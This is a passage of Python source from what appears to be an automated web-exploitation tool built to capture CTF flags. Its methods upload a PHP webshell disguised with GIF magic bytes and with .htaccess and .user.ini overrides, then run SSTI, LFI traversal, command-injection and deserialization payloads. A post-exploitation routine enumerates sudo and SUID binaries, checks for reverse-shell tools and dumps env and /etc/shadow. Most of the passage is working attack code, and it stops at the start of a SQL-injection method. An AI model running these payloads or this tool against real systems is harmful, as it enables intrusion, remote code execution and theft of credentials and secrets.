                r = self.session.get(target, timeout=10)
                xfo = r.headers.get("X-Frame-Options", "")
                csp = r.headers.get("Content-Security-Policy", "")
                if not xfo and "frame-ancestors" not in csp:
                    print_success(f"  [Clickjacking] No X-Frame-Options / CSP frame-ancestors on {target}")
                    self._log_step("Phase 4: Clickjacking", f"Clickjacking possible on {target}", details="Missing X-Frame-Options and CSP frame-ancestors")
                    success = True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success

    def _exploit_dns_rebinding(self):
        """Probe for DNS rebinding by testing wildcard DNS services in SSRF parameters."""
        from modules.dns_rebinding import get_dns_rebinding_payloads
        print_info("Testing DNS Rebinding Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        ssrf_params = [p for p in params if any(k in p.lower() for k in ["url", "link", "redirect", "src", "fetch", "host", "ip"])]
        if not ssrf_params:
            return False
        for p in ssrf_params:
            for payload in get_dns_rebinding_payloads("127.0.0.1"):
                try:
                    r = self.session.get(self.target_url, params={p: payload["payload"]}, timeout=10)
                    if r.status_code == 200 and any(k in r.text.lower() for k in ["accesskey", "secret", "token", "root", "admin"]):
                        print_success(f"  [DNS Rebinding] Potential rebinding via '{p}': {payload['payload']}")
                        self._log_step("Phase 4: DNS Rebinding", f"DNS rebinding via {payload['name']}", details=payload["payload"])
                        self._check_and_store_flags(r.text, f"DNS Rebinding ({payload['name']})")
                        success = True
                        break
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass
        return success

    def _exploit_zip_slip(self):
        """Probe for zip slip by checking for archive upload endpoints."""
        print_info("Testing Zip Slip Vectors...")
        success = False
        # Check for upload endpoints
        upload_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["upload", "import", "extract", "archive"])]
        if not upload_endpoints:
            return False
        for ep in upload_endpoints:
            upload_url = urljoin(self.target_url, ep)
            print_success(f"  [Zip Slip] Archive upload endpoint found: {upload_url}")
            self._log_step("Phase 4: Zip Slip", f"Archive upload at {upload_url}", details="Test with malicious zip containing ../ paths")
            success = True
        return success

    def _exploit_tabnabbing(self):
        """Probe for tabnabbing by checking for target=_blank links without rel=noopener."""
        print_info("Testing Tabnabbing Vectors...")
        success = False
        html = self.state.get("baseline_html", "")
        import re
        # Find target=_blank links without rel=noopener
        matches = re.findall(r'<a[^>]+target=["\']_blank["\'][^>]*>', html)
        for m in matches:
            if "rel=" not in m or "noopener" not in m:
                print_success(f"  [Tabnabbing] target=_blank without rel=noopener: {m[:80]}")
                self._log_step("Phase 4: Tabnabbing", "target=_blank without rel=noopener", details=m[:80])
                success = True
        return success

    def _exploit_css_injection(self):
        """Probe for CSS injection by checking for user-controlled CSS / style injection."""
        print_info("Testing CSS Injection Vectors...")
        success = False
        html = self.state.get("baseline_html", "")
        # Check for reflected input in style tags or style attributes
        params = list(self.state.get("parameters", []))
        for p in params:
            try:
                r = self.session.get(self.target_url, params={p: "test"}, timeout=10)
                if "<style" in r.text and "test" in r.text:
                    print_success(f"  [CSS Injection] Reflected input in style context via '{p}'")
                    self._log_step("Phase 4: CSS Injection", f"CSS injection via '{p}'", details="Input reflected in style context")
                    self._check_and_store_flags(r.text, f"CSS Injection ({p})")
                    success = True
                    break
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success

    def _exploit_ssi(self):
        """Probe for SSI injection by testing SSI directives."""
        print_info("Testing SSI Injection Vectors...")
        success = False
        params = list(self.state.get("parameters", []))
        if not params:
            params = ["page", "file", "include", "view"]
        for p in params:
            try:
                # Test SSI echo directive
                r = self.session.get(self.target_url, params={p: "<!--#echo var=\"DATE_LOCAL\" -->"}, timeout=10)
                if "DATE_LOCAL" not in r.text and any(k in r.text for k in ["20", "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]):
                    print_success(f"  [SSI] SSI directive processed via '{p}'")
                    self._log_step("Phase 4: SSI", f"SSI injection via '{p}'", details="SSI echo directive processed")
                    self._check_and_store_flags(r.text, f"SSI ({p})")
                    success = True
                    break
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success

    def _exploit_xslt(self):
        """Probe for XSLT injection by checking for XML/XSLT processing endpoints."""
        print_info("Testing XSLT Injection Vectors...")
        success = False
        # Check for XML/XSLT endpoints
        xml_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["xml", "xslt", "transform", "report"])]
        if not xml_endpoints:
            return False
        for ep in xml_endpoints:
            xml_url = urljoin(self.target_url, ep)
            try:
                r = self.session.post(xml_url, data="<test/>", timeout=10)
                if r.status_code == 200:
                    print_success(f"  [XSLT] XML/XSLT processing endpoint found: {xml_url}")
                    self._log_step("Phase 4: XSLT", f"XSLT endpoint at {xml_url}", details="Test with malicious XSLT stylesheet")
                    self._check_and_store_flags(r.text, f"XSLT ({xml_url})")
                    success = True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success

    def _exploit_xs_leak(self):
        """Probe for XS-Leak by checking for missing COOP/COEP headers."""
        print_info("Testing XS-Leak Vectors...")
        success = False
        try:
            r = self.session.get(self.target_url, timeout=10)
            coop = r.headers.get("Cross-Origin-Opener-Policy", "")
            coep = r.headers.get("Cross-Origin-Embedder-Policy", "")
            if not coop and not coep:
                print_success(f"  [XS-Leak] Missing COOP/COEP headers on {self.target_url}")
                self._log_step("Phase 4: XS-Leak", "Missing COOP/COEP headers", details="Cross-origin leaks may be possible")
                success = True
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            pass
        return success

    def _exploit_latex(self):
        """Probe for LaTeX injection by checking for LaTeX rendering endpoints."""
        print_info("Testing LaTeX Injection Vectors...")
        success = False
        # Check for LaTeX/PDF rendering endpoints
        latex_endpoints = [ep for ep in self.state.get("endpoints", []) if any(k in ep.lower() for k in ["latex", "tex", "pdf", "render", "math"])]
        if not latex_endpoints:
            return False
        for ep in latex_endpoints:
            latex_url = urljoin(self.target_url, ep)
            try:
                r = self.session.post(latex_url, data={"latex": "\\input{/etc/passwd}"}, timeout=10)
                if r.status_code == 200 and any(k in r.text for k in ["root:", "daemon:", "bin:"]):
                    print_success(f"  [LaTeX] File read via LaTeX on {latex_url}")
                    self._log_step("Phase 4: LaTeX", f"LaTeX injection on {latex_url}", details="\\input file read")
                    self._check_and_store_flags(r.text, f"LaTeX ({latex_url})")
                    success = True
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass
        return success


    def _exploit_file_upload(self):
        """Active Arbitrary File Upload prober and Webshell executor (PHP / Htaccess / User.ini / Magic Bytes)."""
        print_info("Testing Arbitrary File Upload & Webshell Vectors...")
        
        # 1. Identify upload forms and upload endpoints
        upload_targets = []
        for form in self.state["forms"]:
            for inp in form.get("inputs", []):
                if inp.get("type") == "file":
                    upload_targets.append({
                        "action": form["action"],
                        "method": form.get("method", "POST"),
                        "field_name": inp.get("name", "file")
                    })
        
        # If no explicit form with type=file found, check standard upload endpoints
        if not upload_targets:
            for ep in ["upload.php", "upload", "file_upload.php", "uploader.php", "api/upload"]:
                test_ep = urljoin(self.target_url, ep)
                try:
                    r_test = self.session.get(test_ep, timeout=3)
                    if r_test.status_code in [200, 405, 500] or "upload" in r_test.text.lower():
                        upload_targets.append({
                            "action": test_ep,
                            "method": "POST",
                            "field_name": "file"
                        })
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

        if not upload_targets:
            return

        webshell_php = b'GIF89a; <?php system($_GET["cmd"]); ?>'
        test_flag_cmd = "id; whoami; cat /var/www/flag.txt || cat /var/www/*flag* || cat /flag* || cat /flag.txt || cat /app/flag* || find / -name '*flag*' 2>/dev/null"
        
        for target in upload_targets:
            action_url = target["action"]
            field_name = target["field_name"]
            print_info(f"Targeting File Upload Endpoint: [bold cyan]{action_url}[/bold cyan] (Field: [bold yellow]{field_name}[/bold yellow])")

            upload_attempts = [
                # 1. Server Configuration Overwrite (.htaccess)
                {
                    "name": "Apache .htaccess Handler Override",
                    "files": [
                        (".htaccess", b"AddType application/x-httpd-php .png .gif .jpg\nSetHandler application/x-httpd-php\nphp_flag engine on\n", "image/gif"),
                        ("shell.png", webshell_php, "image/png")
                    ],
                    "expected_shell": "shell.png"
                },
                # 2. PHP-FPM Configuration (.user.ini)
                {
                    "name": "PHP-FPM .user.ini Auto-Prepend",
                    "files": [
                        (".user.ini", b"auto_prepend_file=shell.png\n", "text/plain"),
                        ("shell.png", webshell_php, "image/png")
                    ],
                    "expected_shell": "shell.png"
                },
                # 3. Direct PHP Webshells with MIME & Magic Bytes
                {
                    "name": "GIF Magic Bytes Webshell (.php)",
                    "files": [("shell.php", webshell_php, "image/gif")],
                    "expected_shell": "shell.php"
                },
                {
                    "name": "PHTML Webshell (.phtml)",
                    "files": [("shell.phtml", webshell_php, "image/gif")],
                    "expected_shell": "shell.phtml"
                },
                {
                    "name": "PHP5 Webshell (.php5)",
                    "files": [("shell.php5", webshell_php, "image/gif")],
                    "expected_shell": "shell.php5"
                },
                {
                    "name": "PHAR Webshell (.phar)",
                    "files": [("shell.phar", webshell_php, "image/gif")],
                    "expected_shell": "shell.phar"
                },
                {
                    "name": "Double Extension (.php.jpg / .jpg.php)",
                    "files": [("shell.php.jpg", webshell_php, "image/jpeg")],
                    "expected_shell": "shell.php.jpg"
                },
                {
                    "name": "Case Variation (.pHp)",
                    "files": [("shell.pHp", webshell_php, "image/gif")],
                    "expected_shell": "shell.pHp"
                }
            ]

            for attempt in upload_attempts:
                t_name = attempt["name"]
                files_to_upload = attempt["files"]
                expected_filename = attempt["expected_shell"]

                last_upload_resp = None
                for fname, fcontent, ftype in files_to_upload:
                    try:
                        multipart_data = {field_name: (fname, fcontent, ftype)}
                        r_up = self.session.post(action_url, files=multipart_data, timeout=15)
                        last_upload_resp = r_up
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass

                if not last_upload_resp:
                    continue

                possible_paths = []
                # 1. Look for href/src links in upload response
                found_links = re.findall(r"(?:href|src)=['\"]([^'\"]+)['\"]", last_upload_resp.text, re.IGNORECASE)
                for fl in found_links:
                    if expected_filename in fl or fl.endswith(".php") or fl.endswith(".png"):
                        possible_paths.append(urljoin(action_url, fl))
                
                # 2. Look for relative paths in text (e.g. images/shell.png, uploads/shell.png)
                text_paths = re.findall(r"([a-zA-Z0-9_\-\.\/]+" + re.escape(expected_filename) + r")", last_upload_resp.text)
                for tp in text_paths:
                    possible_paths.append(urljoin(action_url, tp))

                # 3. Standard directory candidates
                base_dir = urljoin(action_url, "./")
                for folder in ["", "images/", "uploads/", "files/", "static/uploads/", "media/", "tmp/"]:
                    cand = urljoin(base_dir, f"{folder}{expected_filename}")
                    if cand not in possible_paths:
                        possible_paths.append(cand)

                # Test execution across candidate URLs
                for exec_candidate in set(possible_paths):
                    try:
                        r_exec = self.session.get(exec_candidate, params={"cmd": test_flag_cmd}, timeout=15)
                        
                        prev_flags_count = len(self.state["captured_flags"])
                        self._check_and_store_flags(r_exec.text, f"File Upload RCE ({t_name})")
                        new_flags_found = len(self.state["captured_flags"]) > prev_flags_count
                        
                        is_executing = ("uid=" in r_exec.text or "www-data" in r_exec.text or "groups=" in r_exec.text) and "<?php" not in r_exec.text
                        if is_executing or new_flags_found:
                            print_success(f"Arbitrary File Upload RCE Confirmed via [bold green]{t_name}[/bold green]!")
                            print_success(f"Active Webshell URL: [bold cyan]{exec_candidate}[/bold cyan]")
                            
                            self._log_step("Phase 4: Exploitation", f"Webshell uploaded via {t_name}", curl_cmd=f"curl '{exec_candidate}?cmd=id'")
                            self.state["active_rce_method"] = lambda cmd, u=exec_candidate: self.session.get(u, params={"cmd": cmd}).text
                            
                            LootManager.save_loot_file(self.target_url, "webshell_url.txt", f"Webshell URL: {exec_candidate}\nAttack Method: {t_name}")
                            self.learning_engine.record_success(
                                self.target_url, self.state["tech_stack"], "file_upload", t_name, f"Uploaded {expected_filename}", list(self.state["captured_flags"])
                            )
                            return
                    except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                        pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                        pass

    def _exploit_ssti(self):
        """Active SSTI prober and RCE executor with intelligent error diagnosis, Form/POST support, and WAF mutation."""
        print_info("Testing SSTI Expression Vectors...")
        
        # Build target vectors from discovered forms and URL parameters
        targets = []
        for form in self.state.get("forms", []):
            action_url = form.get("action") or self.target_url
            method = form.get("method", "POST").upper()
            for inp in form.get("inputs", []):
                name = inp.get("name")
                if name and inp.get("type") not in ["file", "submit", "image"]:
                    targets.append({"url": action_url, "method": method, "param": name})
        
        for param in self.state.get("parameters", []):
            targets.append({"url": self.target_url, "method": "GET", "param": param})
            
        if not targets:
            for p in ["content", "name", "template", "page", "q", "msg", "text"]:
                targets.append({"url": self.target_url, "method": "POST", "param": p})
                targets.append({"url": self.target_url, "method": "GET", "param": p})

        engines = get_all_ssti_engines()
        baseline = self.state.get("baseline_html", "")
        flag_cmd = "cat /challenge/flag || cat /challenge/flag.txt || cat /var/www/flag.txt || cat /flag* || cat /flag.txt || cat flag.txt || cat /app/flag* || find / -name '*flag*' 2>/dev/null"

        
        for tgt in targets:
            url = tgt["url"]
            method = tgt["method"]
            param = tgt["param"]
            
            # Generate high-entropy arithmetic multiplication to prevent static HTML false positives
            a, b = random.randint(1111, 9999), random.randint(1111, 9999)
            expected_calc = str(a * b)

            probes = [
                (f"{{{{{a}*{b}}}}}", expected_calc, "Basic Arithmetic"),
                (f"${{{a}*{b}}}", expected_calc, "Mako/Spring"),
                (f"<%= {a}*{b} %>", expected_calc, "ERB")
            ]
            
            # Add mutated level 2 and level 3 SSTI bypasses
            for mut in BypassEngine.mutate_ssti("jinja2", flag_cmd, level=3):
                probes.append((mut["payload"], "picoCTF{", mut["name"]))

            for probe_expr, expected, probe_type in probes:
                try:
                    if method == "POST":
                        r = self.session.post(url, data={param: probe_expr}, timeout=15)
                    else:
                        r = self.session.get(url, params={param: probe_expr}, timeout=15)
                    
                    self._check_and_store_flags(r.text, f"SSTI ({probe_type})")
                    
                    if len(self.state["captured_flags"]) > 0:
                        print_success(f"SSTI Exploited & Flag Captured on [bold yellow]{param}[/bold yellow] via {probe_type}!")
                        self._log_step("Phase 4: Exploitation", f"SSTI exploit succeeded on {param} ({probe_type})")
                        self.learning_engine.record_success(
                            self.target_url, self.state["tech_stack"], "ssti", probe_type, probe_expr, list(self.state["captured_flags"])
                        )
                        return

                    # Cognitive response analysis
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=probe_expr)
                    if diag["ssti_errors"] or diag["waf_detected"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)

                    if expected in r.text and probe_expr not in r.text and expected not in baseline:
                        print_success(f"SSTI Confirmed on parameter [bold yellow]{param}[/bold yellow] ({method}) via '{probe_expr[:30]}'!")
                        self._log_step("Phase 4: Exploitation", f"SSTI confirmed on {param}", curl_cmd=f"curl -X {method} '{url}'")
                        
                        # Weaponize Jinja2 / Python RCE
                        target_cmds = [
                            "cat /challenge/flag",
                            "cat /challenge/flag.txt",
                            "cat /var/www/flag.txt",
                            "cat /flag*",
                            "cat /flag.txt",
                            "cat flag.txt",
                            "cat /app/flag*",
                            flag_cmd
                        ]
                        
                        for single_cmd in target_cmds:
                            all_rce_payloads = BypassEngine.mutate_ssti("jinja2", single_cmd, level=3) + engines.get("jinja2", lambda c: [])(single_cmd)
                            prioritized = self.learning_engine.prioritize_payloads("ssti", self.state["tech_stack"], all_rce_payloads)
                            
                            for p in prioritized:
                                payload_str = p["payload"]
                                if method == "POST":
                                    r_rce = self.session.post(url, data={param: payload_str}, timeout=15)
                                else:
                                    r_rce = self.session.get(url, params={param: payload_str}, timeout=15)
                                    
                                self._check_and_store_flags(r_rce.text, f"SSTI RCE ({p['name']})")
                                
                                # Check if command execution succeeded
                                if "root:" in r_rce.text or "uid=" in r_rce.text or len(self.state["captured_flags"]) > 0:
                                    print_success(f"SSTI RCE Executed Successfully via: {p['name']}")
                                    self.learning_engine.record_success(
                                        self.target_url, self.state["tech_stack"], "ssti", p["name"], payload_str, list(self.state["captured_flags"])
                                    )
                                    return

                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:

                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass



    def _exploit_lfi(self):
        """Active LFI and PHP filter source code extractor with mutation support."""
        print_info("Testing LFI & Source Code Extraction Vectors...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["file", "page", "include", "view", "path", "template", "doc"]

        lfi_payloads = [
            ("php_filter_b64", "php://filter/convert.base64-encode/resource=app.py"),
            ("php_filter_b64_index", "php://filter/convert.base64-encode/resource=index.php"),
            ("php_filter_b64_config", "php://filter/convert.base64-encode/resource=config.php"),
            ("php_filter_b64_no_ext_index", "php://filter/convert.base64-encode/resource=index"),
            ("php_filter_b64_no_ext_config", "php://filter/convert.base64-encode/resource=config"),
            ("php_filter_b64_no_ext_services", "php://filter/convert.base64-encode/resource=services"),
            ("traversal_passwd", "../../../../../../../../etc/passwd"),
            ("traversal_nested", "....//....//....//....//etc/passwd"),
            ("traversal_app", "../../../../../../../../app/app.py"),
            ("traversal_proc", "../../../../../../../../proc/self/environ"),
            ("traversal_passwd_null", "../../../../../../../../etc/passwd%00"),
        ]

        prioritized_lfi = self.learning_engine.prioritize_payloads(
            "lfi", self.state["tech_stack"], [{"name": name, "payload": pay} for name, pay in lfi_payloads]
        )

        for param in test_params:
            for item in prioritized_lfi:
                pay = item["payload"]
                try:
                    r = self.session.get(self.target_url, params={param: pay}, timeout=15)
                    
                    # Cognitive response analysis
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=pay)
                    
                    if diag["waf_detected"]:
                        print_warning(f"WAF detected for LFI payload '{pay}'. Engaging BypassEngine...")
                        mutated = BypassEngine.mutate_lfi(pay, level=3)
                        for m in mutated:
                            # Add dynamically to the loop to be executed later
                            if not any(x["payload"] == m["payload"] for x in prioritized_lfi):
                                prioritized_lfi.append({"name": m["name"], "payload": m["payload"]})
                    
                    if diag["lfi_errors"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)
                    
                    # Check /etc/passwd
                    if "root:x:0:0:" in r.text:
                        print_success(f"LFI Verified on parameter [bold yellow]{param}[/bold yellow] via '{pay}'!")
                        self._log_step("Phase 4: Exploitation", f"LFI confirmed on {param}", details="/etc/passwd extracted")
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "lfi", item["name"], pay, [])
                    
                    # Check Base64 PHP/Source code
                    b64_matches = re.findall(r"[A-Za-z0-9+/=]{40,}", r.text)
                    for b64 in b64_matches:
                        try:
                            decoded = base64.b64decode(b64).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "import " in decoded or "def " in decoded or "SECRET" in decoded:
                                fname = pay.split("resource=")[-1] if "resource=" in pay else "leaked_source.py"
                                print_success(f"Source Code Leaked via LFI ({fname})! Saved to loot.")
                                self.state["leaked_source_files"][fname] = decoded
                                LootManager.save_source_file(self.target_url, fname, decoded)
                                self._check_and_store_flags(decoded, f"Leaked Source ({fname})")
                                self._log_step("Phase 4: Exploitation", f"Leaked {fname} source code via LFI", curl_cmd=f"curl '{self.target_url}?{param}={pay}'")
                                self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "lfi", item["name"], pay, list(self.state["captured_flags"]))
                                break  # Stop matching more base64 once we got it from this payload
                        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                            pass
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

    def _exploit_command_injection(self):
        """Active Command Injection prober with WAF mutation and error feedback."""
        print_info("Testing Command Injection Vectors...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["cmd", "ip", "host", "ping", "exec", "query"]

        probes = [
            ("sep_semicolon", "; id", "uid="),
            ("sep_pipe", "| id", "uid="),
            ("subshell", "$(id)", "uid="),
            ("backticks", "`id`", "uid="),
            ("newline", "%0aid%0a", "uid="),
            ("ifs_space", ";id$IFS$9", "uid="),
            ("brace_expansion", ";{id,}", "uid=")
        ]

        for param in test_params:
            for name, probe, indicator in probes:
                try:
                    r = self.session.get(self.target_url, params={param: probe}, timeout=15)
                    diag = ResponseAnalyzer.analyze_response(r.text, r.status_code, dict(r.headers), probe_sent=probe)
                    if diag["waf_detected"]:
                        summary = ResponseAnalyzer.format_diagnostic_summary(diag)
                        if summary:
                            console.print(summary)

                    if indicator in r.text:
                        print_success(f"Command Injection Confirmed on parameter [bold yellow]{param}[/bold yellow] via '{probe}'!")
                        self._log_step("Phase 4: Exploitation", f"Command Injection confirmed on {param}", curl_cmd=f"curl '{self.target_url}?{param}={probe}'")
                        
                        # Weaponize flag extraction
                        flag_r = self.session.get(self.target_url, params={param: "; cat /flag* || cat /flag.txt || find / -name '*flag*' 2>/dev/null"}, timeout=15)
                        self._check_and_store_flags(flag_r.text, "Command Injection Output")
                        
                        self.state["active_rce_method"] = lambda cmd: self.session.get(self.target_url, params={param: f"; {cmd}"}).text
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "cmd_inj", name, probe, list(self.state["captured_flags"]))
                        return
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

    def _deep_dive_rce(self):
        """DEEP-DIVE MODE: When RCE is confirmed, STOP trying other vulns and
        FOCUS on this one - like a human would. Chain: RCE -> reverse shell ->
        privilege escalation -> extract ALL flags."""
        if not self.state["active_rce_method"]:
            return

        print_header("وضع التعمق في الثغرة", "DEEP-DIVE MODE: Focusing on Confirmed RCE")
        print_success("[bold yellow]RCE confirmed! Stopping other exploit vectors and DEEP-DIVING into this one...[/bold yellow]")
        self._log_step("Phase 4: Deep-Dive", "RCE confirmed - switching to focused exploitation mode")

        rce = self.state["active_rce_method"]

        # ── Step 1: System recon - who are we, what's around ──────────────
        print_info("Step 1: System Reconnaissance...")
        recon_cmd = "id; whoami; hostname; pwd; uname -a; cat /etc/os-release 2>/dev/null | head -3"
        try:
            out = rce(recon_cmd)
            self._check_and_store_flags(out, "RCE System Recon")
            print_info(f"  Identity: {out.strip().splitlines()[0] if out.strip() else 'Unknown'}")
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
            pass

        # ── Step 2: Hunt for ALL flags on the filesystem ──────────────────
        print_info("Step 2: Hunting for ALL flag files on filesystem...")
        flag_cmds = [
            "find / -name '*flag*' -type f 2>/dev/null",
            "find / -name '*.txt' -type f 2>/dev/null | grep -iE 'flag|secret|key'",
            "ls -la / /root /home /tmp /var/www 2>/dev/null",
            "cat /flag* /flag.txt /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null",
            "grep -rE 'picoCTF|flag\\{' /var/www /home /tmp /root 2>/dev/null | head -20",
        ]
        for cmd in flag_cmds:
            try:
                out = rce(cmd)
                if out and out.strip():
                    self._check_and_store_flags(out, f"RCE Flag Hunt: {cmd[:40]}")
                    # Save interesting output to loot
                    if "flag" in out.lower() or "pico" in out.lower():
                        LootManager.save_loot_file(self.target_url, "rce_flag_hunt.txt", out)
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # ── Step 3: Check for reverse shell opportunity & interactive shell ─
        print_info("Step 3: Checking for reverse shell / interactive shell capability...")
        shell_check = "which bash sh nc ncat python python3 perl php 2>/dev/null; echo '---'; ls -la /dev/tcp 2>/dev/null"
        try:
            out = rce(shell_check)
            print_info(f"  Available shells: {out.strip()}")
        except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
            pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
            pass

        # ── Step 4: Privilege Escalation recon (sudo / SUID / writable) ───
        print_info("Step 4: Privilege Escalation Reconnaissance...")
        privesc_cmds = [
            "sudo -l 2>/dev/null",
            "find / -perm -4000 -type f 2>/dev/null",
            "cat /etc/passwd 2>/dev/null | grep -E 'root|admin'",
            "ls -la /etc/cron* /var/spool/cron 2>/dev/null",
            "find / -writable -type f 2>/dev/null | grep -vE 'proc|sys|dev' | head -20",
        ]
        for cmd in privesc_cmds:
            try:
                out = rce(cmd)
                if out and out.strip():
                    self._check_and_store_flags(out, f"PrivEsc Recon: {cmd[:40]}")
                    if "sudo" in cmd and "NOPASSWD" in out:
                        print_success("[bold green]SUDO NOPASSWD found! Attempting root escalation...[/bold green]")
                        root_out = rce("sudo cat /flag* /root/flag* /flag.txt 2>/dev/null")
                        self._check_and_store_flags(root_out, "Root Flag via Sudo")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # ── Step 5: Dump environment & configs for secrets ────────────────
        print_info("Step 5: Dumping environment variables & configs...")
        env_cmds = [
            "env",
            "cat /etc/passwd /etc/shadow 2>/dev/null",
            "find / -name '*.env' -o -name 'config.php' -o -name 'config.py' -o -name '*.conf' 2>/dev/null | head -20",
        ]
        for cmd in env_cmds:
            try:
                out = rce(cmd)
                if out and out.strip():
                    self._check_and_store_flags(out, f"Env/Config Dump: {cmd[:40]}")
                    LootManager.save_loot_file(self.target_url, "rce_env_dump.txt", out)
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        # ── Step 6: Check for container escape indicators ─────────────────
        print_info("Step 6: Container escape check...")
        container_cmds = [
            "cat /proc/1/cgroup 2>/dev/null",
            "ls -la /.dockerenv /run/.containerenv 2>/dev/null",
            "mount 2>/dev/null | head -10",
        ]
        for cmd in container_cmds:
            try:
                out = rce(cmd)
                if out and out.strip():
                    self._check_and_store_flags(out, f"Container Check: {cmd[:40]}")
                    if "docker" in out.lower() or "kubepods" in out.lower():
                        print_warning("[bold red]Target is in a container! Checking escape vectors...[/bold red]")
            except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                pass

        print_success("[bold green]Deep-Dive RCE exploitation complete.[/bold green]")

    def _exploit_deserialization(self):
        """Active Insecure Deserialization prober (Pickle, PyYAML, Node.js, PHP)."""
        print_info("Testing Insecure Deserialization Entrypoints...")
        test_params = list(self.state["parameters"])
        if not test_params:
            test_params = ["data", "payload", "session", "state", "obj", "config"]

        flag_cmd = "cat /flag* || cat /flag.txt"
        pickle_pay = generate_pickle_payload(flag_cmd)["Base64 Payload"]
        yaml_pay = generate_pyyaml_payload(flag_cmd)["Default Payload"]
        node_pay = generate_nodejs_serialize_payload(flag_cmd)["Base64 Command Payload"]

        deser_probes = [
            ("python_pickle", pickle_pay),
            ("pyyaml_unsafe", yaml_pay),
            ("nodejs_serialize", node_pay)
        ]

        for param in test_params:
            for name, payload_val in deser_probes:
                try:
                    r = self.session.get(self.target_url, params={param: payload_val}, timeout=15)
                    prev_flags = len(self.state["captured_flags"])
                    self._check_and_store_flags(r.text, f"Deserialization ({name})")
                    new_flags_found = len(self.state["captured_flags"]) > prev_flags
                    
                    if new_flags_found or "root:x:0:0:" in r.text or "uid=" in r.text:
                        print_success(f"Deserialization Exploitation Confirmed on parameter [bold yellow]{param}[/bold yellow] via {name}!")
                        self._log_step("Phase 4: Exploitation", f"Deserialization RCE on {param} ({name})")
                        self.learning_engine.record_success(self.target_url, self.state["tech_stack"], "deserialization", name, payload_val[:30], list(self.state["captured_flags"]))
                        return
                except (requests.exceptions.RequestException, ValueError, TypeError, KeyError) as e:
                    pass  # TODO: Handle specific exceptions like requests.exceptions.RequestException
                    pass

    def _exploit_nosql(self):
        """Active NoSQL Injection (MongoDB $ne, $gt, $regex, $where) Auth Bypass & Data Exfiltration."""
        nosql_success = NoSQLInjectionEngine.detect_and_exploit(
            session=self.session,
            target_url=self.target_url,
            forms=self.state.get("forms", []),
            endpoints=list(self.state.get("endpoints", [])),
            tech_stack=self.state.get("tech_stack", []),
            flag_checker=lambda text, ctx: self._check_and_store_flags(text, ctx),
            state=self.state,
        )
        if nosql_success:
            self._log_step("Phase 4: Exploitation", "NoSQL Injection Auth Bypass achieved")
            self.learning_engine.record_success(
                self.target_url, self.state["tech_stack"], "nosql_injection", "mongodb_bypass",
                "NoSQL operator injection", list(self.state["captured_flags"])
            )

            # If no flag yet, attempt blind regex extraction of password (password may BE the flag)
            if not self.state["captured_flags"]:
                for form in self.state.get("forms", []):
                    action = form.get("action", self.target_url)
                    inputs = [i for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
                    input_names = [i.get("name", "") for i in inputs]

                    user_field = None
                    pass_field = None
                    for n in input_names:
                        nl = n.lower()
                        if any(k in nl for k in ["user", "login", "name", "email"]):
                            user_field = n
                        elif any(k in nl for k in ["pass", "pwd", "key"]):
                            pass_field = n

                    if user_field and pass_field:
                        extracted = NoSQLInjectionEngine.extract_field_via_regex(
                            self.session, action, user_field, pass_field, target_user="admin"
                        )
                        if extracted:
                            self._check_and_store_flags(extracted, "NoSQL Blind Regex Extraction")
                            self._check_and_store_flags(f"flag{{{extracted}}}", "NoSQL Blind Regex Extraction")

    def _exploit_sqli(self):
